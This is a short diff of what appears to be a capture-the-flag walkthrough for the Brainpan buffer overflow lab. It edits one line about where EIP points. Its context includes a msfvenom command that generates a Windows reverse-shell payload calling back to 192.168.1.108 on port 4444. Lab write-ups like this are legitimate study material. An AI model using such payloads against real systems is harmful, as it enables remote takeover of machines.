@@ -122,7 +122,7 @@ index.html              [Status: 200, Size: 215, Words: 7, Lines: 9]
 	- Make sure EIP points to the selected JMP Address
 		- Check `bp 0x311712f3`
 		![](images/Pasted%20image%2020220203031720.png)
-		- Points to `brainpan.exe`
+		- EIP Points to `brainpan.exe`
 7. Generate Shellcode
 	```
 	msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 EXITFUNC=thread -b '\x00' -f python
